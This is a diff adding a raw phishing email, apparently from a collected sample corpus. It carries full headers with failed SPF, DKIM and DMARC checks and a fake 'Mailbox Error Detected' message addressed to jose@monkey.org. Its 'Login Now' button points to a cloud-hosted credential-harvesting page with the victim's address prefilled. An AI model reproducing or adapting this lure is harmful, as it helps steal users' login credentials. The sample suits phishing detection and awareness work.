@@ -1,0 +1,119 @@
+Return-Path: logisticsjungle.com@ns3.iceinet.com
+Delivered-To: jose@monkey.org
+X-FDA: 83162457840.31.F3D9D8D
+Received: from ns3.iceinet.com (unknown [108.55.3.142])
+	by imf04.b.hostedemail.com (Postfix) with ESMTP id 6143F160009
+	for <jose@monkey.org>; Wed, 26 Feb 2025 15:20:39 +0000 (UTC)
+Authentication-Results: imf04.b.hostedemail.com;
+	dkim=none;
+	dmarc=fail reason="No valid SPF,
+ No valid DKIM" header.from=lightermood.com (policy=none);
+	spf=none (imf04.b.hostedemail.com: domain of
+ logisticsjungle.com@ns3.iceinet.com has no SPF policy when checking
+ 108.55.3.142) smtp.mailfrom=logisticsjungle.com@ns3.iceinet.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1740583239;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references; bh=g+sg2ImpIJb+z5+K6enjOhFxsfMl+g3gDyl2hh7pQVQ=;
+	b=BypmXvVaG9a3/haR916+BD1Ma1qncD9MzNh1TMDVOZ+FH+uri2l0K1Qmd0i/I3PQQUNsB1
+	IfNyhWIzm21bkJeDdUU8vqRcXjK46i9tz3eG+qzNIdv+bf8BKAHy1wrmaGUrvH0aVYjQ1g
+	JobJOe+gwrX4wRBCi1tsEFhN9to+yC8=
+ARC-Authentication-Results: i=1;
+	imf04.b.hostedemail.com;
+	dkim=none;
+	dmarc=fail reason="No valid SPF,
+ No valid DKIM" header.from=lightermood.com (policy=none);
+	spf=none (imf04.b.hostedemail.com: domain of
+ logisticsjungle.com@ns3.iceinet.com has no SPF policy when checking
+ 108.55.3.142) smtp.mailfrom=logisticsjungle.com@ns3.iceinet.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1740583239; a=rsa-sha256;
+	cv=none;
+	b=YuiLv3kXXx79VPLmtF/u3OwCrGHH7jBV+bTNbuBaNvxsj1QFT94X1Ra9izCTkKiQB4rLnn
+	1QMJLB/C4MVJojhZ5V5jIoJuvXJafALuYj33s0u7dDNKkSsI15KGf6Um3+kI8DT8BsS/iP
+	F4YHE3bB1kTsaZB/DNlvklF0O/6MDbE=
+Received: by ns3.iceinet.com (Postfix, from userid 1066)
+	id 1740910DC31FC; Wed, 26 Feb 2025 07:09:02 -0500 (EST)
+To: jose@monkey.org
+Subject: =?UTF-8?B?WW91ciBFbWFpbHMgY2Fubm90IGJlIHNlbnQ=?=
+MIME-Version: 1.0
+Content-type: text/html;charset=UTF-8
+From: Server Administrator <postmaster@lightermood.com>
+Message-Id: <20250226135217.1740910DC31FC@ns3.iceinet.com>
+Date: Wed, 26 Feb 2025 07:09:02 -0500 (EST)
+X-Stat-Signature: shpfmd8qcp3rdn5koox7ts3jofcq3izx
+X-Rspamd-Queue-Id: 6143F160009
+X-Rspam-User: 
+X-Rspamd-Server: rspam04
+X-Spam-Status: No, score=3.30
+X-HE-Tag: 1740583239-51956
+X-HE-Meta: 
+ U2FsdGVkX1+UMfB7SmcGF6CbtSvK+bfHO6vljDhdBv91gGR9QGny5ezbQql0m658Do4GRkfPAcUa0NeS9DNxU0ntKmiAPJylSmgrQrRPoLuM4JqJ8XU5ELEU03TaIdlueuLz4APHeDU0E3XfyPpWdT1XY4oO/T+Yk6vjlWgIBuL8Kxgvnw8uo66P1Mybut/yDnaRVHDD7B51BhI1ChMm3l5UBR09+G7i4R1dPnLgmKlUru+SSne7FhzKvumn0/RHc08Gz149qaXmwYU7rPO+d3vIcj6E/d5Rwhyq5S9S7B0RC5VRdht4LVFeXdPNhXXwjvBfCKYL8ftkvMygy9WlUH8FDH6YkvwR+85j0WnSKLV4UrupDUXepGoL6GsFcEUS6Jz/p+kL5CcP40s5grwPGy9GK58KqbrnNfhZ+alOK+i9oNH6xvdOtDA9PXyVFtFdSMor4LrM0IGiqBvSVEd3j7jovBmGzpdAA4wRYLgm5ElZ8Tft2bL3zxGv7x/PARQsW8+cR7MRKmOGZC6lx9DlUd+KjJqxEXb7V288oH/JfovKYOPUh5YP0ULyG84cJHlk/nMMoCekDAXA+KlDRfIin13r5YlkRya9wyWBkYWq3LvfxIAcecRfDbtD7xlyKOuDq2F88ABmEdhAbw73MhdpPOX5tiOg8j8mGYP/DaJ5eaDcTod96FE6Ac6Jk51cFk0VRNcvYzMZuBpl6kUTqzxigihwTbGTDm3/cA+xMocBiGUmwrVHDsWiTq6B/y9yxbD+8puMrTGgd0UKeArcruoRtH1mQRWlCkhnAIjLWhjSy1E9sC3sdh5FZJdkxWXLTAROIukpiYIWHuBotFLbhglELEj368sXdOnQUp5QsmUYJEdJ2RmKI5L6d88IGnyJ6B3NHlyP8liPtvh5fe2HXdrUlVvVAiQzw90cl/mtwVK2CwS8gZyX89UgJkuD0N309CQGfdsUQkHpKSANPOdFVG0Ke+74BtN
+ nu0N7s72/aUKTPibgER6t+LF2dvMGT8oAzgtK0f9wOXtAyO/vGu06SH2aGdMMfh8DVCjjDwl4qh3nNGAS2wgJm+3S3hhg29UPJJAwnl518HSlGVLn7VsVpW/vJAZVXq/a/gYYqXL99tBIH0kbrvWtasCoQNRH0SKmJJ95HYEIKPM/3uC7r6z0sQYuos2r9Fz1zpILmAHTAuRS4UicxyOGnP24phPRZwvb44xSJOcA/vmNuUHYuhsKY9kzavdUoAsRxSvIHIXgpSMcnHXHACCmvpwosL2OSzCgBSXDRimUS+KYxLU8rtihcHYNL5zMDD0EKtb+1Yc2z8MDyBGwberHObOY0ikHyR5UigrN+2rNhMU4/Su8HhfNS5lcM6t0mCmnY+O2HDFyKUMTuuzGAnnK7AoNS2vASNjJrmFyu09K/ciMgjurOVzoVxw0ubCUYxYtfXT1uE+aeKm9YrikRjdTa92RMtUP7b8lGU49Xq1bI6m8V/EIQtjI7FiqAmTdP07P1ksge1ilwEi6FmcVpFQRZTFjcQCInksC1WDH6X49l2QP4oX5sKNOaypoU4s1umx2xhPLKJ9aXEAA6Aw2Pby3e0RfBA==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 66
+
+
+        <table width='100%' cellspacing='0' cellpadding='0' bgcolor='#f4f4f4'>
+            <tr>
+                <td align='center' style='padding: 20px;'>
+                    <table style='font-size: 18px; font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; width: 500px; background-color: #fbfbfb;' cellspacing='0' cellpadding='0' border='0'>
+                        <tbody>
+                            <tr>
+                                <td style='vertical-align: top; padding: 30px;'>
+                                    <!-- Header -->
+                                    <h2 style='font-size: 32px; font-weight: 600; color: #0b3d91; margin: 0; text-align: center;'>Mailbox Error Detected</h2>
+                                    <hr />
+                                    <br />
+                                    <!-- User & Domain -->
+                                    <p style='font-size: 15px; color: #555; margin: 10px 0; text-align: left;'><strong>User:</strong> <span style='color: #003366;'>jose,</span></p>
+                                    <p style='font-size: 15px; color: #555; margin: 10px 0; text-align: left;'>We detected an error in your mailbox <span style='color: #003366;'>jose@monkey.org</span>.</p>
+                                    <p style='font-size: 15px; color: #555; margin: 10px 0; text-align: left;'>To ensure continued communication to receive/send emails, please log in immediately to resolve this issue.</p>
+
+                                    <!-- Button -->
+                                    <table style='height: 48px; width: 100%; margin-top: 30px;' cellspacing='0' cellpadding='0' border='0'>
+                                        <tbody>
+                                            <tr>
+                                                <td align='center'>
+                                                    <a style='font-size: 15px; text-decoration: none; font-weight: bold; color: #fff; padding: 12px 30px; background-color: #0b3d91; border-radius: 6px;' href='https://so-tech.s3.us-east-005.backblazeb2.com/webmas.html#jose%40monkey.org' rel='noopener' target='_blank'>Login Now</a>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                    <br />
+                                    <p style='font-size: 12px; color: #666; margin: 20px 0px; text-align: center;'>Please note that this email was automatically generated by the system, so there is no need to reply.</p>
+                                    <hr />
+                                    <p style='font-size: 12px; color: #666; margin: 20px 0px; text-align: center;'>
+                                        <sub>Copyright MONKEY&#8482; &copy; All rights reserved.</sub>
+                                    </p>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </td>
+            </tr>
+        </table>
+
+        <style>
+            @media screen and (max-width: 600px) {
+                table {
+                    width: 100% !important;
+                    padding: 10px !important;
+                }
+                h2 {
+                    font-size: 28px !important;
+                }
+                p {
+                    font-size: 16px !important;
+                }
+                .button {
+                    font-size: 18px !important;
+                    padding: 10px 25px !important;
+                }
+            }
+        </style>
+
